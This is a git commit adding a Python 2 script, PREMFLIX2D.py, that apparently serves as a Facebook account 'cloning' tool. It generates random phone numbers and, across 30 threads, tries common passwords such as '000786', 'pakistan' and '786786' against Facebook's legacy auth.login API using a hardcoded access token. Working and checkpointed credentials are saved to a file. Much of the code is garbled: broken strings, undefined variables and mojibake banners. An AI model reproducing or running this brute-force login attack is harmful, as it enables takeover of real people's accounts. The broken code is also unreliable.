ab2576fdfec407f964573594e04e12c906d0daaf
taufiqhidy <46922081+taufiqhidy@users.noreply.github.com>
2021-08-12 16:40:05 +0700

    Create PREMFLIX2D.py

---
+++ PREMFLIX2D.py
@@ -0,0 +1,305 @@
+#!/usr/bin/python2
+#coding=utf-8
+#Jangan Di recod Juga ngentod
+#Recod boleh tapi kasih nama gue Tod
+import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,getpass
+os.system('rm -rf .txt')
+for n in range(10000):
+
+    nmbr = random.randint(1111111, 9999999)
+    
+    sys.stdout = open('.txt', 'a')
+
+    print(nmbr)
+
+    sys.stdout.flush()
+    
+try:
+    import requests
+except ImportError:
+    os.system('pip2 install mechanize')
+    
+try:
+    import mechanize
+except ImportError:
+    os.system('pip2 install request')
+    time.sleep(1)
+    os.system('Then type: python PREMFILX.py')
+
+import os,sys,time,datetime,random,hashlib,re,threading,json,urllib
+
+def keluar():
+        print("Terima kasih telah menggunakan tool ini")
+        (os.system.exit)
+
+def acak(b):
+    w = 'ahtdzjc'
+    d = ''
+    for i in x:
+        d += '!'+w[random.randint(0,len(w)-1)]+i
+    return cetak(d)
+
+
+def cetak(b):
+    w = 'ahtdzjc'
+    for i in w:
+        j = w.index(i)
+        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
+    x += '\033[0m'
+    x = x.replace('!0','\033[0m')
+    sys.stdout.write(x+'\n')
+
+
+def jalan(z):
+	for e in z + '\n':
+		sys.stdout.write(e)
+		sys.stdout.flush()
+		time.sleep(00000.1)
+def tik():
+	titik = ['.   ','..  ','... ']
+	for o in titik:
+		print("\r\x1b[1;93mBlackTigerMF–ˆMF–ˆFM–ˆMF–ˆFM–ˆMF–ˆFM–ˆMF–ˆFM–ˆMF–ˆFM–ˆMF–ˆFM–ˆMF–ˆFM–ˆMF–ˆFM–ˆMF–’FM–’MF–’FM–’MF–’FM–’MF–’FM–’..99% \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)
+
+
+back = 0
+ok = []
+id = []
+cp = []
+vulnot = "\033[31mNot Vuln"
+vuln = "\033[32mVuln"
+
+os.system("clear")
+print(""")
+"\033[1;93m          MF–FM–ˆMF–MFFM FMMF–‘FM–‘MF–ˆ"
+"\033[1;93m          FM–‘MF–ˆFM–‘FMF MFMF–ˆMF–„FM–ˆ"
+"\033[1;92m          F–MF–ˆF–MFMFM–„F–MF–ˆMFMF–ˆM–FM–„F–FM–ˆFFM–ˆMFFM–ˆM–MF–„F–FM–ˆ"
+"\033[1;96m          F–ˆMF–‘MFMF–ˆF–MF–ˆMFMF–ˆF–‘F–MF–‘M–ˆMFFM–ˆMFFM–ˆF–‘F–MF–‘F–ˆ"
+"\033[1;97m          M&F»M&F»M&F»M&F»M&F»M&F»M&F»"
+"\033[1;98m          M&F»M&F¹M&F¹M&F¹M&F¹M&F¹M&F»"
+"\033[1;99m          M&F»M&F¹M&F¾M&F¾M&F¾M&F¹M&F»"
+"\033[1;91m          M&F»M&F¹M&F¾M&F·M&F¾M&F¹M&F»"
+"\033[1;92m          M&F»M&F¹M&F¾M&F·M&F¾M&F¹M&F»"
+"\033[1;93m          M&F»M&F¹M&F¾M&F¾M&F¾M&F¹M&F»"
+"\033[1;94m          M&F»M&F¹M&F¹M&F¹M&F¹M&F¹M&F»"
+"\033[1;95m          M&F»M&F»M&F»M&F»M&F»M&F»M&F»"
+"\033[1;96m          WHATSAPP NUMBER +62 31 2776 8957      ++966 54 399 2329"
+"""
+
+#====Logo=====#
+
+"""
+def logo1:
+print(""")
+
+"\033[1;91m              __________      ________      ________      "
+"\033[1;92m            /    ____   /    /   ___  \   /  ______/     ______   "
+"\033[1;93m          /    /___/  /     /  /___/  /  /   ______/    /       \  "
+"\033[1;94m        /    _______/      /  /\  \     /   /_____     /  /\_/\  \  "
+"\033[1;95m      /__/                /__/  \__\   /________/     /__/     \__\  "
+"\033[1;96m                  PREMIUM                  PREMIUM"
+"\033[1;97m      PREMIRE                  PREMIRE                  PREMIRE"
+
+"""
+#====Logo=====#
+"""
+
+"""
+def logo2:
+print()
+"\033[1;97m               ____      ____         _____________                                              "
+"\033[1;91m              /    \    /    \       |   ________ /                                              "
+"\033[1;92m             /  /\  \  /  /\  \      |  |________                                                "
+"\033[1;93m            /  /  \  \/  /  \  \     |   _______/                                                "
+"\033[1;94m           /__/    \____/    \__\    |__|                                                        " 
+"\033[1;95m          PREMIUM  FREE  PREMIUM  FREE  PREMIUM  FREE                                            "
+"\033[1;96m           __________  _________________       ___            __________     __________________  "
+"\033[1;97m           |    ______/\______   ______/     /  _  \         |    ___   \    \______    ______/  "
+"\033[1;97m           |    |_____        |  |          /  /_\  \        |   |__/   /           |  |         "
+"\033[1;96m           |_____    |        |  |         /  _____  \       |   ____  \            |  |         "
+"\033[1;95m           ______|   |        |  |        /  /     \  \      |  |    \  \           |  |         "
+"\033[1;94m         /___________|        |__|       /__/       \__\     |__|     \__\          |__|         
+          
+print("\033[1;92mWELCOME TO MILZU&FIRDOOS")
+            loop = 'false'
+    else:
+            print("\033[1;91m^-M&F-^¸WRONG")
+            os.system('xdg-open https://facebook.com/profile.php?id=100071289164743 ')
+#====LICENSE=====#
+#=================#
+def lisensi():
+    os.system('clear')
+    logine()
+#====premfilx=====#
+def premfilx():
+    os.system('clear')
+    print("logo1")
+    print("\033[1;96m[1]\x1b[1;93mStart cloning ( no logine )")
+    time.sleep(0.05)
+    print('\x1b[1;95m[0]\033[1;92m Exit (Coming Soon)')
+    pilih_login()
+def pilih_login():
+    peak = raw_input("\n\033[1;93mCHOOSE: \033[1;91m")
+    if peak =="":
+        print("\x1b[1;95mFill In Correctly")
+        pilih_premfilx()
+    elif peak =="1":
+        Zeek()
+def Zeek():
+    os.system('clear')
+    print("logo1")
+    print('\x1b[1;91m[1] M&F MULAI CRACK/Start Crack')
+    time.sleep(0.05)
+    print('\x1b[1;92m[0] \033[1;93m Kembali/Back')
+    time.sleep(0.05)
+    action()
+def action():
+    peak = raw_input('\n\033[1;95mCHOOSE:\033[1;97m')
+    if peak =='':
+        print('[!] Fill In Correctly')
+        action()
+    elif peak =="1":              
+        os.system("clear")
+        print("logo2")
+        print("Enter any Indonesia&Pakistan Mobile code Number"+'\n')
+        print(' Enter any code 1 to 49')
+        try:
+            c = raw_input("\033[1;96mCHOOSE : ")
+            k="03"
+            idlist = ('.txt')
+            for line in open(idlist,"r").readlines():
+                id.append(line.strip())
+        except IOError:
+            print ("[!] File Not Found")
+            raw_input("\n[ Back ]")
+            blackmafiax()
+    elif peak =='0':
+        login()
+    else:
+        print('[!] Fill In Correctly')
+        action()
+    print("50* '\033[1;91m-'")
+    xxx = str(len(id))
+    jalan ('\033[1;91m Total ids number: '+xxx)
+    jalan ('\033[1;93mCode you choose: '+c)
+    jalan ("\033[1;95mM&F $ total 5 password will clone ^M&F-^M&F-^M&F-^M&F-^M&F-^M&F11 digit , last 7 digit, indonesia&pakistan, 000786, 786786 password Start Cracking...")
+    jalan ("\033[1;96mTo Stop Process Press Ctrl+z")
+    print("50* '\033[1;92m-'")
+    def main(arg):
+        global cp,ok
+        user = arg
+        try:
+            os.mkdir('save')
+        except OSError:
+            pass
+        try:
+            pass1 = user
+            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+            q = json.load(data)
+            if 'access_token' in q:
+                print("'\x1b[1;91m(OK)  ' + k + c + user + '  |  ' + pass1  ")
+                ok = open('save/cloned.txt', 'a')
+                ok.write(k+c+user+pass1+'\n')
+                ok.close()
+                ok.append(c+user+pass1)
+            else:
+                if 'www.facebook.com' in q['error_msg']:
+                    print("'\033[1;91m(CP) ' + k + c + user + '  |  ' + pass1  ")
+                    cp = open('save/cloned.txt', 'a')
+                    cp.write(k+c+user+pass1+'\n')
+                    cp.close()
+                    cp.append(c+user+pass1)
+                else:
+                    pass2 = k + c + user
+                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                    q = json.load(data)
+                    if 'access_token' in q:
+                        print("'\x1b[1;93m(OK)  ' + k + c + user +  '  |  ' + pass2  ")
+                        ok = open('save/cloned.txt', 'a')
+                        ok.write(k+c+user+pass2+'\n')
+                        ok.close()
+                        ok.append(c+user+pass2)
+                    else:
+                        if 'www.facebook.com' in q['error_msg']:
+                            print("'\033[1;93m(CP) ' + k + c + user + '  |  ' + pass2  ")
+                            cp = open('save/cloned.txt', 'a')
+                            cp.write(k+c+user+pass2+'\n')
+                            cp.close()
+                            cp.append(c+user+pass2)
+                        else:
+                            pass3="000786"
+                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                            q = json.load(data)
+                            if 'access_token' in q:
+                                print("'\x1b[1;95m(OK)  ' + k + c + user + '  |  ' + pass3  ")
+                                ok = open('save/cloned.txt', 'a')
+                                ok.write(k+c+user+pass3+'\n')
+                                ok.close()
+                                ok.append(c+user+pass3)
+                            else:
+                                if 'www.facebook.com' in q['error_msg']:
+                                    print("'\033[1;95m(CP) ' + k + c + user + '  |  ' + pass3  ")
+                                    cp = open('save/cloned.txt', 'a')
+                                    cp.write(k+c+user+pass3+'\n')
+                                    cp.close()
+                                    cp.append(c+user+pass3)
+                                else:
+                                    pass4="pakistan"
+                                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                                    q = json.load(data)
+                                    if 'access_token' in q:
+                                        print("'\x1b[1;96m(OK)  ' + k + c + user + '  |  ' + pass4  ")
+                                        ok = open('save/cloned.txt', 'a')
+                                        ok.write(k+c+user+pass4+'\n')
+                                        ok.close()
+                                        ok.append(c+user+pass4)
+                                    else:
+                                        if 'www.facebook.com' in q['error_msg']:
+                                            print("'\033[1;96m(CP) ' + k + c + user + '  |  ' + pass4  ")
+                                            cp = open('save/cloned.txt', 'a')
+                                            cp.write(k+c+user+pass4+'\n')
+                                            cp.close()
+                                            cp.append(c+user+pass4)
+                                        else:
+                                            pass5="786786"
+                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                                            q = json.load(data)
+                                            if 'access_token' in q:
+                                                print("'\x1b[1;94m(OK)  ' + k + c + user + '  |  ' + pass5  ")
+                                                ok = open('save/cloned.txt', 'a')
+                                                ok.write(k+c+user+pass5+'\n')
+                                                ok.close()
+                                                ok.append(c+user+pass5)
+                                            else:
+                                                if 'www.facebook.com' in q['error_msg']:
+                                                    print("'\033[1;94m(CP) ' + k + c + user + '  |  ' + pass5  ")
+                                                    cp = open('save/cloned.txt', 'a')
+                                                    cp .write(k+c+user+pass5+'\n')
+                                                    cp .close()
+                                                    cp .append(c+user+pass5)
+                                                                                                                                                                                                                
+                                                                                                                                                                                                                
+                                                                                                                                                                                                            
+                                                                                                                                                                                                            
+                                                                                                                                                                                                            
+                                                                                                                                                                                                            
+                                                                                                                                                                                                            
+                                                                                                                                                                                                            
+                                                                                                                                                                                                                    
+                                                                                                                                                                                                            
+        except:
+            pass
+        
+    p = ThreadPool(30)
+    p.map(main, id)
+    print("50* '\033[1;91m-'")
+    print('Milzu&Firdoos Process Has Been Completed^M&F-^M&F-^M&F-^M&F-M&F-M&F...100%')
+    print("'Total OKAY/CHECKPOINT : '+str(len(oks))+'/'+str(len(cp)'")
+    print("'Milzu&Firdoos Cloned Accounts Has Been Saved:save/cloned.txt'")
+    jalan("Note : Your M&F (CP)Accounts Open after 5 to 8 days")
+    print("\033[1;91mThanks \033[1;97mUseing My M&F Tool")
+    print("\n\033[1;92m[\033[1;92mBack\033[1;95m]")
+
+
+if __name__=="__main__":
+     premfilx()
+     login()
